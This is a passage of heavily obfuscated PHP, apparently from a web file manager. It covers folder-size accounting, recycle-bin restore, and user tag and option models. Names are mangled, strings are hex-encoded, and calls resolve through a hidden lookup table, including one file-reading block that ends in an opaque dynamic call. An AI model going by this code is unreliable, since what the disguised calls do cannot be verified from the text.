foreach ($Ô™¢½€œ as $‘¨õêŒ => $ÒÔÒÕ³¸) { $Ô™¢½€œ[$‘¨õêŒ] = intval($ÒÔÒÕ³¸); $this->sourceCacheClear($ÒÔÒÕ³¸); } $ƒÛ·Àêå = array($Ïüí¯´¦[184] => array($Ïüí¯´¦[7], $Ô™¢½€œ)); $ˆØ¾ğ«ò = array($Ïüí¯´¦[626] => $€ïÁù²Ú, $Ïüí¯´¦[473] => time()); $this->where($ƒÛ·Àêå)->save($ˆØ¾ğ«ò); } public function folderSizeReset($áÖó€›ä, $—Ş¶ô„ = false) { $éÔªõêÍ =& $_SERVER[³à¼î¯á]; if ($this->statusIgnoreResetSpace) { return; } $çøø¿Î = $this->sourceInfo($áÖó€›ä); $Æ«©®ªÁ = $éÔªõêÍ[2267] . $áÖó€›ä; CacheLock::lock($Æ«©®ªÁ, 20); if ($—Ş¶ô„ === !1) { $this->sourceCacheClear($áÖó€›ä); $çøø¿Î = $this->sourceInfo($áÖó€›ä); $Ä­°Ùî = array($éÔªõêÍ[452] => $áÖó€›ä, $éÔªõêÍ[479] => 0); $˜êŸ²Äİ = $this->where($Ä­°Ùî)->sum($éÔªõêÍ[79]); $—Ş¶ô„ = intval($˜êŸ²Äİ) - intval($çøø¿Î[$éÔªõêÍ[79]]); } if ($—Ş¶ô„ == 0) { return CacheLock::unlock($Æ«©®ªÁ); } $Ó£‘Ğ´Í = $this->parentLevelArray($çøø¿Î[$éÔªõêÍ[560]]); if (!$Ó£‘Ğ´Í) { $Ó£‘Ğ´Í = array(); } $Ó£‘Ğ´Í[] = $çøø¿Î[$éÔªõêÍ[184]]; $Ä­°Ùî = array($éÔªõêÍ[184] => array($éÔªõêÍ[467], $Ó£‘Ğ´Í)); if ($—Ş¶ô„ < 0) { $Ä­°Ùî[$éÔªõêÍ[79]] = array($éÔªõêÍ[1065], abs($—Ş¶ô„)); } $this->where($Ä­°Ùî)->setAdd($éÔªõêÍ[79], $—Ş¶ô„); CacheLock::unlock($Æ«©®ªÁ); $­ûƒÌ¡æ = $éÔªõêÍ[2268] . $çøø¿Î[$éÔªõêÍ[181]] . $éÔªõêÍ[4] . $çøø¿Î[$éÔªõêÍ[545]]; $³‘Å¨ = array($çøø¿Î[$éÔªõêÍ[181]], $çøø¿Î[$éÔªõêÍ[545]]); TaskRun::timeLimitCall($­ûƒÌ¡æ, $éÔªõêÍ[2269], $³‘Å¨, 1.5); } public function folderSizeResetChildren($îÌñ‰ï) { $äŒĞÒŒ± =& $_SERVER[³à¼î¯á]; $this->sourceCacheClear($îÌñ‰ï); $§¶èÕÌ = $this->sourceInfo($îÌñ‰ï); $øÏíğû¾ = array($äŒĞÒŒ±[621] => 1, $äŒĞÒŒ±[624] => $§¶èÕÌ[$äŒĞÒŒ±[545]], $äŒĞÒŒ±[627] => array($äŒĞÒŒ±[587], $§¶èÕÌ[$äŒĞÒŒ±[560]] . $îÌñ‰ï . $äŒĞÒŒ±[588])); $Ç¸ïÎ‡¨ = $äŒĞÒŒ±[2270]; $ƒœÏ”¿É = $this->field($Ç¸ïÎ‡¨)->where($øÏíğû¾)->select(); $øÏíğû¾[$äŒĞÒŒ±[460]] = 0; $„ş®¾¼ = $this->field($Ç¸ïÎ‡¨)->where($øÏíğû¾)->select(); if (!$„ş®¾¼) { return; } $ƒœÏ”¿É[] = $§¶èÕÌ; $ƒœÏ”¿É = array_to_keyvalue($ƒœÏ”¿É, $äŒĞÒŒ±[184]); foreach ($ƒœÏ”¿É as $–âÔ¤›‚ => $é„•“‹™) { $ƒœÏ”¿É[$–âÔ¤›‚][$äŒĞÒŒ±[2271]] = $ƒœÏ”¿É[$–âÔ¤›‚][$äŒĞÒŒ±[79]]; $ƒœÏ”¿É[$–âÔ¤›‚][$äŒĞÒŒ±[79]] = 0; } foreach ($„ş®¾¼ as $é„•“‹™) { $¦×ä³¡ë = $é„•“‹™[$äŒĞÒŒ±[183]] . $äŒĞÒŒ±[12]; if (!isset($ƒœÏ”¿É[$¦×ä³¡ë])) { continue; } if ($é„•“‹™[$äŒĞÒŒ±[480]] == $ƒœÏ”¿É[$¦×ä³¡ë][$äŒĞÒŒ±[480]]) { $ƒœÏ”¿É[$¦×ä³¡ë][$äŒĞÒŒ±[79]] += $é„•“‹™[$äŒĞÒŒ±[79]]; } } foreach ($ƒœÏ”¿É as $é„•“‹™) { $§Çû³ÃÛ = $this->parentLevelArray($é„•“‹™[$äŒĞÒŒ±[560]]); foreach ($§Çû³ÃÛ as $¦×ä³¡ë) { $¦×ä³¡ë = $¦×ä³¡ë . $äŒĞÒŒ±[12]; if (!isset($ƒœÏ”¿É[$¦×ä³¡ë])) { continue; } if ($é„•“‹™[$äŒĞÒŒ±[480]] == $ƒœÏ”¿É[$¦×ä³¡ë][$äŒĞÒŒ±[480]]) { $ƒœÏ”¿É[$¦×ä³¡ë][$äŒĞÒŒ±[79]] += $é„•“‹™[$äŒĞÒŒ±[79]]; } } } $£–¨˜çğ = array(); foreach ($ƒœÏ”¿É as $é„•“‹™) { if ($é„•“‹™[$äŒĞÒŒ±[79]] == $é„•“‹™[$äŒĞÒŒ±[2271]]) { continue; } $£–¨˜çğ[] = array($äŒĞÒŒ±[184], $é„•“‹™[$äŒĞÒŒ±[184]], $äŒĞÒŒ±[79], $é„•“‹™[$äŒĞÒŒ±[79]]); } $this->saveAll($£–¨˜çğ); } public function userSpaceReset($ÇÔ¸ùÕ° = false) { $ï’’Šíí =& $_SERVER[³à¼î¯á]; $¿ÑÅÂ—• = $this->where(array($ï’’Šíí[181] => self::TYPE_USER, $ï’’Šíí[545] => $ÇÔ¸ùÕ°, $ï’’Šíí[460] => 0))->sum($ï’’Šíí[79]); $¿ÑÅÂ—• = !$¿ÑÅÂ—• || $¿ÑÅÂ—• <= 0 ? 0 : $¿ÑÅÂ—•; Model($ï’’Šíí[553])->userEdit($ÇÔ¸ùÕ°, array($ï’’Šíí[1941] => $¿ÑÅÂ—•)); } public function targetSpaceUpdate($µØà¾, $¤ğóÀ¯•) { $«€Ë­„ =& $_SERVER[³à¼î¯á]; if (!$¤ğóÀ¯•) { return; } if (!in_array($µØà¾, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ĞÊ–¡÷ = $this->targetSpaceSize($µØà¾, $¤ğóÀ¯•); if ($µØà¾ == self::TYPE_USER) { Model($«€Ë­„[553])->userEdit($¤ğóÀ¯•, array($«€Ë­„[1941] => $ĞÊ–¡÷)); } else { if ($µØà¾ == self::TYPE_GROUP) { Model($«€Ë­„[561])->groupEdit($¤ğóÀ¯•, array($«€Ë­„[1941] => $ĞÊ–¡÷)); } } } public function targetSpaceSize($€û·àúò, $ıÍé–ŠĞ) { $Ÿ„¢„ªˆ =& $_SERVER[³à¼î¯á]; $…†˜æ»Û = 0; $Ÿ‚ù³üñ = $this->targetSourceRoot($€û·àúò, $ıÍé–ŠĞ, !0); foreach ($Ÿ‚ù³üñ as $×ç“İ½) { if (!$×ç“İ½) { continue; } $…†˜æ»Û += floatval($×ç“İ½[$Ÿ„¢„ªˆ[79]]); $¾‚ÛŞÇ = array($Ÿ„¢„ªˆ[627] => array($Ÿ„¢„ªˆ[587], $Ÿ„¢„ªˆ[570] . $×ç“İ½[$Ÿ„¢„ªˆ[184]] . $Ÿ„¢„ªˆ[588])); $â‚´ò = Model($Ÿ„¢„ªˆ[478])->field($Ÿ„¢„ªˆ[466])->where($¾‚ÛŞÇ)->select(); $â‚´ò = array_to_keyvalue($â‚´ò, $Ÿ„¢„ªˆ[12], $Ÿ„¢„ªˆ[184]); $â‚´ò = array_unique(array_filter($â‚´ò)); if ($â‚´ò) { $¾‚ÛŞÇ = array($Ÿ„¢„ªˆ[466] => array($Ÿ„¢„ªˆ[467], $â‚´ò)); $…†˜æ»Û += floatval($this->where($¾‚ÛŞÇ)->sum($Ÿ„¢„ªˆ[79])); } } $…†˜æ»Û = !$…†˜æ»Û || $…†˜æ»Û <= 0 ? 0 : $…†˜æ»Û; return $…†˜æ»Û; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÛÊØáÆı) { return $this->fileTypeProfile($ÛÊØáÆı, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ù»ŠÃ¨Š) { return $this->fileTypeProfile($ù»ŠÃ¨Š, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÍğÂ¨ÅÆ, $Ï§Ğˆ¼§) { $§­¯×Ìğ =& $_SERVER[³à¼î¯á]; $³±ÇäÛ‹ = $§­¯×Ìğ[2272] . $ÍğÂ¨ÅÆ . $§­¯×Ìğ[11] . $Ï§Ğˆ¼§; $¡„ƒãù¿ = Cache::get($³±ÇäÛ‹); if ($¡„ƒãù¿) { return $¡„ƒãù¿; } $°Ğ ığó = array($§­¯×Ìğ[621] => 0); if ($ÍğÂ¨ÅÆ != !1) { $°Ğ ığó[$§­¯×Ìğ[545]] = $ÍğÂ¨ÅÆ; $°Ğ ığó[$§­¯×Ìğ[181]] = $Ï§Ğˆ¼§; } $¡ƒŒ×³º = array(); $¡ƒŒ×³º[$§­¯×Ìğ[2273]] = array($§­¯×Ìğ[2274] => LNG($§­¯×Ìğ[2273]), $§­¯×Ìğ[2275] => $this->where($°Ğ ığó)->count(), $§­¯×Ìğ[592] => $this->where($°Ğ ığó)->sum($§­¯×Ìğ[79])); $µëÍâ³ó = KodIO::fileTypeList(); foreach ($µëÍâ³ó as $ËØç›Ÿª => $Õ—§àùË) { $°Ğ ığó[$§­¯×Ìğ[461]] = $this->fileTypeWhere($ËØç›Ÿª); $¡ƒŒ×³º[$ËØç›Ÿª] = array($§­¯×Ìğ[2274] => $Õ—§àùË[$§­¯×Ìğ[32]], $§­¯×Ìğ[2275] => $this->where($°Ğ ığó)->count(), $§­¯×Ìğ[592] => $this->where($°Ğ ığó)->sum($§­¯×Ìğ[79])); } Cache::set($³±ÇäÛ‹, $¡ƒŒ×³º, 1200); return $¡ƒŒ×³º; } public function fileNameExist($ıøÍ¶ßË, $Ö½öÎ†) { $ÕìÛ„ÈÒ =& $_SERVER[³à¼î¯á]; $à¶Å´¨Ÿ = $this->field($ÕìÛ„ÈÒ[2276])->where(array($ÕìÛ„ÈÒ[183] => $ıøÍ¶ßË, $ÕìÛ„ÈÒ[32] => $Ö½öÎ†, $ÕìÛ„ÈÒ[480] => 0))->find(); return is_array($à¶Å´¨Ÿ) ? $à¶Å´¨Ÿ[$ÕìÛ„ÈÒ[184]] : !1; } public function childList($Ê¥›Ğ—Ü) { $ğÚ™Ğ» =& $_SERVER[³à¼î¯á]; $İô°«Ú£ = $ğÚ™Ğ»[2247] . $Ê¥›Ğ—Ü; if (isset(self::$cacheChildList[$İô°«Ú£])) { return self::$cacheChildList[$İô°«Ú£]; } $ËÑÜÑ• = array($ğÚ™Ğ»[183] => intval($Ê¥›Ğ—Ü), $ğÚ™Ğ»[480] => 0); $êå‘¾ßÀ = $this->where($ËÑÜÑ•)->select(); $êå‘¾ßÀ = $êå‘¾ßÀ ? $êå‘¾ßÀ : array(); self::$cacheChildList[$İô°«Ú£] = $êå‘¾ßÀ; foreach ($êå‘¾ßÀ as $š¹ş¶ı®) { $İô°«Ú£ = $ğÚ™Ğ»[508] . $š¹ş¶ı®[$ğÚ™Ğ»[184]]; self::$cacheSourceInfo[$İô°«Ú£] = $š¹ş¶ı®; } return $êå‘¾ßÀ; } public function fileNameAuto($‚£å‰ıì, $‰‹ŠÊñ‰, $©šçØşñ = REPEAT_RENAME, $€¸œÜ = false) { $”–Œ€‡ =& $_SERVER[³à¼î¯á]; $¿œ¶Ø = get_path_ext($‰‹ŠÊñ‰); $Éµ»¡Ä› = $¿œ¶Ø ? get_path_ext_name($‰‹ŠÊñ‰) . $”–Œ€‡[2277] . $¿œ¶Ø : $‰‹ŠÊñ‰ . $”–Œ€‡[435]; $ÎÚ‘ùéó = array($”–Œ€‡[183] => $‚£å‰ıì, $”–Œ€‡[480] => 0, $”–Œ€‡[32] => array($”–Œ€‡[434], $Éµ»¡Ä›)); $ÌËö‚éÕ = $this->field($”–Œ€‡[32])->where($ÎÚ‘ùéó)->select(); $ªÙÕ¼á© = array_to_keyvalue($ÌËö‚éÕ, $”–Œ€‡[12], $”–Œ€‡[32]); return $this->fileNameAutoGet($ªÙÕ¼á©, $‰‹ŠÊñ‰, $©šçØşñ, $€¸œÜ); } public function fileNameAutoGet($ÕşŸ›ôŒ, $Õ°İ×Í—, $–Îæ‹¤, $Ü±ÄÙÀç) { $³š¥Øİ½ =& $_SERVER[³à¼î¯á]; if ($–Îæ‹¤ == REPEAT_REPLACE || !$ÕşŸ›ôŒ || !in_array_not_case($Õ°İ×Í—, $ÕşŸ›ôŒ) || $Ü±ÄÙÀç && $–Îæ‹¤ != REPEAT_RENAME_FOLDER) { return $Õ°İ×Í—; } if ($–Îæ‹¤ == REPEAT_SKIP) { return !1; } $Şõú¾±í = $³š¥Øİ½[10] . get_path_ext($Õ°İ×Í—); $Şõú¾±í = $Şõú¾±í == $³š¥Øİ½[10] || $Ü±ÄÙÀç ? $³š¥Øİ½[12] : $Şõú¾±í; for ($õ÷Ö„‹ª = 1; $õ÷Ö„‹ª <= count($ÕşŸ›ôŒ) + 1; $õ÷Ö„‹ª++) { $¨óƒÔËö = substr($Õ°İ×Í—, 0, strlen($Õ°İ×Í—) - strlen($Şõú¾±í)); $…ºçŠÅ = $¨óƒÔËö . "\50{$õ÷Ö„‹ª}\x29{$Şõú¾±í}"; if (!in_array_not_case($…ºçŠÅ, $ÕşŸ›ôŒ)) { return $…ºçŠÅ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\x63\145\137\162\145\x63\x79\x63\154\145"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\x69\155\x65", "\164\x69\155\x65", "\x69\156\163\145\162\164", "\146\165\156\143\164\x69\157\x6e")); public function listData($Ç‹º«êÌ = false) { $ìÈ‚é¶Í =& $_SERVER[³à¼î¯á]; $Ç‹º«êÌ = $Ç‹º«êÌ ? $Ç‹º«êÌ : USER_ID; $ùèöË“ª = $this->where(array($ìÈ‚é¶Í[1744] => $Ç‹º«êÌ))->select(); return array_to_keyvalue($ùèöË“ª, $ìÈ‚é¶Í[12], $ìÈ‚é¶Í[184]); } public function moveToRecycle($Ø°’ËÄ¸) { $Ù•£³„Í =& $_SERVER[³à¼î¯á]; $Ã÷Ëª¬Š = Model($Ù•£³„Í[1388]); $İÍÇÎ¨È = $Ã÷Ëª¬Š->sourceInfo($Ø°’ËÄ¸); if (!$İÍÇÎ¨È || $İÍÇÎ¨È[$Ù•£³„Í[480]] == $Ù•£³„Í[91]) { return; } $«µØÀïú = array($Ù•£³„Í[466] => $Ø°’ËÄ¸, $Ù•£³„Í[1744] => USER_ID, $Ù•£³„Í[623] => $İÍÇÎ¨È[$Ù•£³„Í[181]], $Ù•£³„Í[624] => $İÍÇÎ¨È[$Ù•£³„Í[545]], $Ù•£³„Í[627] => $İÍÇÎ¨È[$Ù•£³„Í[560]]); $this->add($«µØÀïú); $this->recycleMove($Ø°’ËÄ¸, 1); if ($İÍÇÎ¨È[$Ù•£³„Í[460]] == $Ù•£³„Í[91]) { $‹’¯Øä = array($Ù•£³„Í[627] => array($Ù•£³„Í[587], $İÍÇÎ¨È[$Ù•£³„Í[560]] . $Ø°’ËÄ¸ . $Ù•£³„Í[588])); $Ã÷Ëª¬Š->where($‹’¯Øä)->setField($Ù•£³„Í[480], 1); } } public function clear() { $this->remove(!1); } public function remove($ß´‡Ùã = false, $™µª÷¦Í = false) { $±¼¡‰±¬ =& $_SERVER[³à¼î¯á]; $™µª÷¦Í = $™µª÷¦Í ? $™µª÷¦Í : USER_ID; $ñûüğƒø = Model($±¼¡‰±¬[1388]); $ª›á¸ö = $this->listData($™µª÷¦Í); $ß´‡Ùã = $ß´‡Ùã === !1 ? !1 : $ß´‡Ùã; $¢ë‰¤ = array(); foreach ($ª›á¸ö as $®‹¦×Ú) { if ($ß´‡Ùã != !1 && !in_array($®‹¦×Ú, $ß´‡Ùã)) { continue; } $¼á¼» = $ñûüğƒø->sourceInfo($®‹¦×Ú); $ñûüğƒø->remove($®‹¦×Ú, !1); $¤ÆŞÚëË = $¼á¼»[$±¼¡‰±¬[181]] . $±¼¡‰±¬[11] . $¼á¼»[$±¼¡‰±¬[545]]; $¢ë‰¤[$¤ÆŞÚëË] = array($±¼¡‰±¬[623] => $¼á¼»[$±¼¡‰±¬[181]], $±¼¡‰±¬[545] => $¼á¼»[$±¼¡‰±¬[545]]); $this->where(array($±¼¡‰±¬[184] => $®‹¦×Ú))->delete(); } foreach ($¢ë‰¤ as $‡¿øğ©) { $ñûüğƒø->targetSpaceUpdate($‡¿øğ©[$±¼¡‰±¬[181]], $‡¿øğ©[$±¼¡‰±¬[545]]); } } public function restore($Ôä°­ğÄ = false) { $Õ’›Ö›„ = $this->listData(); $this->_restoreSource($Õ’›Ö›„, $Ôä°­ğÄ); } public function removeUserAll($ø¼˜ëñõ) { $this->remove(!1, $ø¼˜ëñõ); } public function restoreItem($ŞÓíû¦) { $this->_restoreSource(array($ŞÓíû¦), array($ŞÓíû¦)); } private function _restoreSource($Ëó¦—·º, $Í”áã¢) { $ÛÙòÕÃ¥ =& $_SERVER[³à¼î¯á]; $Î³Äèë = Model($ÛÙòÕÃ¥[1388]); $Í”áã¢ = $Í”áã¢ == !1 ? !1 : $Í”áã¢; if (!$Ëó¦—·º) { return !0; } $ş´×¾åÚ = array(); foreach ($Ëó¦—·º as $·ˆ˜Ù°“) { if ($Í”áã¢ != !1 && !in_array($·ˆ˜Ù°“, $Í”áã¢)) { continue; } $æøşñ©á = $Î³Äèë->sourceInfo($·ˆ˜Ù°“); $·¼ú¦åÅ = $Î³Äèë->sourceInfo($æøşñ©á[$ÛÙòÕÃ¥[183]]); if ($·¼ú¦åÅ[$ÛÙòÕÃ¥[480]] == $ÛÙòÕÃ¥[91]) { continue; } $Î³Äèë->lockMoveStart($·ˆ˜Ù°“); $this->recycleMove($·ˆ˜Ù°“, 0); if ($æøşñ©á[$ÛÙòÕÃ¥[460]] == $ÛÙòÕÃ¥[91]) { $µ‘Ì‚­ = array($ÛÙòÕÃ¥[627] => array($ÛÙòÕÃ¥[587], $æøşñ©á[$ÛÙòÕÃ¥[560]] . $·ˆ˜Ù°“ . $ÛÙòÕÃ¥[588])); $Î³Äèë->where($µ‘Ì‚­)->setField($ÛÙòÕÃ¥[480], 0); $this->restoreFolderChildren($·ˆ˜Ù°“, $Ëó¦—·º); } $this->where(array($ÛÙòÕÃ¥[184] => $·ˆ˜Ù°“))->delete(); $Î³Äèë->folderSizeReset($æøşñ©á[$ÛÙòÕÃ¥[183]]); $ş´×¾åÚ[] = $æøşñ©á[$ÛÙòÕÃ¥[183]]; if ($æøşñ©á[$ÛÙòÕÃ¥[460]] == $ÛÙòÕÃ¥[91]) { $ş´×¾åÚ[] = $·ˆ˜Ù°“; } $Î³Äèë->lockMoveEnd($·ˆ˜Ù°“); } $Î³Äèë->updateModifyTime($ş´×¾åÚ); } private function restoreFolderChildren($âŠ×í…ö, $‡ôàæúé) { $áÀêûÍ¸ =& $_SERVER[³à¼î¯á]; $ØàŠ÷‘ = Model($áÀêûÍ¸[1388]); $È©•ú¬„ = array($áÀêûÍ¸[184] => array($áÀêûÍ¸[7], array())); foreach ($‡ôàæúé as $¼Ùâ…¥ß) { if ($¼Ùâ…¥ß == $âŠ×í…ö) { continue; } if (!$ØàŠ÷‘->isParentOf($âŠ×í…ö, $¼Ùâ…¥ß)) { continue; } $ôí»½İ = $ØàŠ÷‘->sourceInfo($¼Ùâ…¥ß); if ($ôí»½İ[$áÀêûÍ¸[460]] == $áÀêûÍ¸[91]) { $È©•ú¬„[] = array($áÀêûÍ¸[627] => array($áÀêûÍ¸[587], $ôí»½İ[$áÀêûÍ¸[560]] . $¼Ùâ…¥ß . $áÀêûÍ¸[588])); } else { $È©•ú¬„[$áÀêûÍ¸[184]][1][] = $¼Ùâ…¥ß; } } if (!$È©•ú¬„[$áÀêûÍ¸[184]][1]) { unset($È©•ú¬„[$áÀêûÍ¸[184]]); } if (!$È©•ú¬„) { return; } if (is_array($È©•ú¬„[$áÀêûÍ¸[184]]) && is_array($È©•ú¬„[$áÀêûÍ¸[184]][1])) { $È©•ú¬„[$áÀêûÍ¸[184]][1] = array_unique($È©•ú¬„[$áÀêûÍ¸[184]][1]); } $È©•ú¬„[$áÀêûÍ¸[1050]] = $áÀêûÍ¸[2055]; $ØàŠ÷‘->where($È©•ú¬„)->setField($áÀêûÍ¸[480], 1); } private function recycleMove($™«öûÉ×, $Â¨÷Ø›¼ = 1) { $¦“Âç×ï =& $_SERVER[³à¼î¯á]; $‹œ¦á‹¶ = Model($¦“Âç×ï[1388]); $±Æğò…– = Model($¦“Âç×ï[2278]); $ÕÏ«Š°Ò = array($¦“Âç×ï[184] => $™«öûÉ×); if ($Â¨÷Ø›¼) { $‹œ¦á‹¶->where($ÕÏ«Š°Ò)->setField($¦“Âç×ï[480], 1); $±Æğò…–->eventRecycle($™«öûÉ×, $¦“Âç×ï[2279]); } else { $×ÍïÃÙ = $‹œ¦á‹¶->where($ÕÏ«Š°Ò)->find(); $öà†›É = $×ÍïÃÙ[$¦“Âç×ï[460]] == $¦“Âç×ï[91]; $¹ñŠâÁ = $‹œ¦á‹¶->fileNameAuto($×ÍïÃÙ[$¦“Âç×ï[183]], $×ÍïÃÙ[$¦“Âç×ï[32]], REPEAT_RENAME_FOLDER, $öà†›É); if ($¹ñŠâÁ != $×ÍïÃÙ[$¦“Âç×ï[32]]) { $‹œ¦á‹¶->rename($™«öûÉ×, $¹ñŠâÁ); } $‹œ¦á‹¶->where($ÕÏ«Š°Ò)->setField($¦“Âç×ï[480], 0); $±Æğò…–->eventRecycle($™«öûÉ×, $¦“Âç×ï[2280]); } } } goto cå¸¦Æ¥; dø·à¾çá: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\157\x70\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($œã¯»¬õ) { $¾ñÄæôÌ =& $_SERVER[³à¼î¯á]; $ŠòğŸË’ = defined($¾ñÄæôÌ[2179]) && USER_ID ? USER_ID : $¾ñÄæôÌ[12]; return "\125\x73\145\x72\x4f\x70\164\151\x6f\156\x5f{$œã¯»¬õ}\x5f" . $ŠòğŸË’; } protected function filterWhere($¾­¿«›ú) { $„©Ö†ÙŸ =& $_SERVER[³à¼î¯á]; $¾­¿«›ú[$„©Ö†ÙŸ[1753]] = defined($„©Ö†ÙŸ[2179]) && USER_ID ? USER_ID : $„©Ö†ÙŸ[12]; return $¾­¿«›ú; } public function cacheRemoveUser($©½ñêâà, $êĞàÈßÒ) { return Cache::remove("\x55\163\145\x72\117\x70\x74\x69\x6f\156\137{$©½ñêâà}\137" . $êĞàÈßÒ); } protected function optionDefault($ÍòôÏåÇ = '') { $çú„ÓşŠ =& $_SERVER[³à¼î¯á]; if ($ÍòôÏåÇ == $çú„ÓşŠ[12]) { return $GLOBALS[$çú„ÓşŠ[6]][$çú„ÓşŠ[2479]]; } if ($ÍòôÏåÇ == $çú„ÓşŠ[2480]) { return $GLOBALS[$çú„ÓşŠ[6]][$çú„ÓşŠ[2481]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\56\x74\141\147\114\x69\163\164"; public $modelType = "\x55\x73\x65\162\117\160\164\x69\x6f\156"; public $field = array("\156\141\x6d\x65", "\x73\x74\171\154\x65", "\x73\157\162\164"); public function listData($É…È·çÅ = false, $á¢çàÇÖ = "\163\157\x72\164", $œõ¢Ü¼Ä = false) { return parent::listData($É…È·çÅ, $á¢çàÇÖ, $œõ¢Ü¼Ä); } public function remove($Ó­Ğ°ùÊ) { return parent::remove($Ó­Ğ°ùÊ); } public function add($›·™Ôìé, $á˜ù´“å = "\x6c\x61\x62\145\x6c\55\x67\x72\145\x79\55\x6e\157\x72\155\x61\x6c") { $Ùìñ”˜¨ =& $_SERVER[³à¼î¯á]; if ($this->findByName($›·™Ôìé)) { return !1; } $„ÇİÂ·¿ = array($Ùìñ”˜¨[469] => $›·™Ôìé, $Ùìñ”˜¨[534] => $á˜ù´“å, $Ùìñ”˜¨[1956] => $this->getSort($Ùìñ”˜¨[310]) + 1); return parent::insert($„ÇİÂ·¿); } public function update($ß÷Í§, $Îõ¦«’ú) { $—ÒŠÇ˜¾ =& $_SERVER[³à¼î¯á]; $Ë¼¿Î¤¢ = $this->listData($ß÷Í§); $•”ãËÏ = $this->findByName($Îõ¦«’ú[$—ÒŠÇ˜¾[32]]); if (!$Ë¼¿Î¤¢ || $•”ãËÏ && $•”ãËÏ[$—ÒŠÇ˜¾[450]] != $Ë¼¿Î¤¢[$—ÒŠÇ˜¾[450]]) { return !1; } return parent::update($ß÷Í§, $Îõ¦«’ú); } public function moveTop($µÛ£Ì×ó) { $ì¯’×˜ˆ =& $_SERVER[³à¼î¯á]; $òëêØæš = parent::listData(); $®ûèš– = $this->getSort($ì¯’×˜ˆ[309]); foreach ($òëêØæš as &$ÉğÉ´¯ş) { if ($ÉğÉ´¯ş[$ì¯’×˜ˆ[450]] == $µÛ£Ì×ó) { $ÉğÉ´¯ş[$ì¯’×˜ˆ[1976]] = $®ûèš–; continue; } $ÉğÉ´¯ş[$ì¯’×˜ˆ[1976]] += 1; } unset($ÉğÉ´¯ş); return parent::resetData($òëêØæš); } public function moveBottom($£ß³ÉÖÏ) { $¼¸Ì¾Î =& $_SERVER[³à¼î¯á]; $¶ÍÃ· = $this->getSort($¼¸Ì¾Î[310]) + 1; return parent::update($£ß³ÉÖÏ, array($¼¸Ì¾Î[1976] => $¶ÍÃ·)); } public function resetSort($¢ô“«ƒ¨) { $ÓŞÖÇÏ =& $_SERVER[³à¼î¯á]; $–˜şÓĞ = array(); $¢ô“«ƒ¨ = is_array($¢ô“«ƒ¨) ? $¢ô“«ƒ¨ : array(); for ($ÊÔ¬¯ = 0; $ÊÔ¬¯ < count($¢ô“«ƒ¨); $ÊÔ¬¯++) { $–˜şÓĞ[$¢ô“«ƒ¨[$ÊÔ¬¯] . $ÓŞÖÇÏ[12]] = $ÊÔ¬¯ + 1; } $ËêÒ ©¢ = parent::listData(); foreach ($ËêÒ ©¢ as &$£†øÚŠè) { $úÎÃâÀŞ = $–˜şÓĞ[$£†øÚŠè[$ÓŞÖÇÏ[450]]]; $£†øÚŠè[$ÓŞÖÇÏ[1976]] = $úÎÃâÀŞ ? $úÎÃâÀŞ : $£†øÚŠè[$ÓŞÖÇÏ[1976]]; } unset($£†øÚŠè); return parent::resetData($ËêÒ ©¢); } private function getSort($šŸí«Â¹) { $Š¢©àö =& $_SERVER[³à¼î¯á]; $Ûª­Şñ‡ = parent::listData(); $áñÎ·Ì = array_to_keyvalue($Ûª­Şñ‡, $Š¢©àö[12], $Š¢©àö[1976]); if (!$áñÎ·Ì) { $áñÎ·Ì = array(0); } $áËôŠà… = $šŸí«Â¹ == $Š¢©àö[310] ? max($áñÎ·Ì) : min($áñÎ·Ì); return intval($áËôŠà…); } } goto fù†ì”½–Ü; Aåƒ‚šäêñ: function binCheckBigger($öèğ“‡È, $çóÕåÖÈ) { return $öèğ“‡È > $çóÕåÖÈ; } $_SERVER[$_SERVER[ÇßåŠĞ][3]] = ("\70\64\70\71"."\63\60")+0;$_2nl0="u7wlhmfz8ynkbpqr2x0c5d941v6gotseai3jfbz9vrysih52amo36jn10ku4cd7qetx8glpw1z2lc7s8di";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($àÙÚˆÂ, $¿¸©ëˆ¬) { $·×îğ¸ç =& $_SERVER[³à¼î¯á]; if (isset(self::$_methodList[$àÙÚˆÂ])) { return @call_user_func_array(self::$_methodList[$àÙÚˆÂ], $¿¸©ëˆ¬); } else { if (method_exists($this, $àÙÚˆÂ)) { return call_user_func_array(array($this, $àÙÚˆÂ), $¿¸©ëˆ¬); } else { think_exception(__CLASS__ . $·×îğ¸ç[4] . $àÙÚˆÂ . $·×îğ¸ç[5]); } } } public static function __callStatic($½Ì¶Ï¸§, $Ü°î„ß) { if (isset(self::$_methodListStatic[$½Ì¶Ï¸§])) { return call_user_func_array(self::$_methodListStatic[$½Ì¶Ï¸§], $Ü°î„ß); } else { if (method_exists(self, $½Ì¶Ï¸§)) { return call_user_func_array(array(self, $½Ì¶Ï¸§), $Ü°î„ß); } else { show_json("{$½Ì¶Ï¸§}\50\x29\x20\x6e\157\x74\x20\x65\x78\151\x73\x74\x3b", !1); } } } public static function addMethod($ÃÃ§–â‹, $ÛÒ…ÎÒÃ) { self::$_methodList[$ÃÃ§–â‹] = $ÛÒ…ÎÒÃ; } public static function addMethodStatic($¯§‰»ÀØ, $º†¡è×) { self::$_methodListStatic[$¯§‰»ÀØ] = $º†¡è×; } } goto cŒËæ‰ä˜; cïÄºê²”Ë: if ($_SERVER[$_SERVER[³à¼î¯á][921]] != $_SERVER[$_SERVER[³à¼î¯á][1008]]) { $_getc = $_SERVER[³à¼î¯á][924]; $_getfile = $_SERVER[$_SERVER[³à¼î¯á][925]] . $_SERVER[³à¼î¯á][926]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³à¼î¯á][253], $_getfilec); if (count($_getarrs) < $_SERVER[³à¼î¯á][665]) { $exit = $_SERVER[³à¼î¯á][927]; $exit(); } $_act = $_SERVER[³à¼î¯á][1009]; $_act($_SERVER[$_SERVER[³à¼î¯á][922]]); } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\156\x67"; const STATYS_KILL = 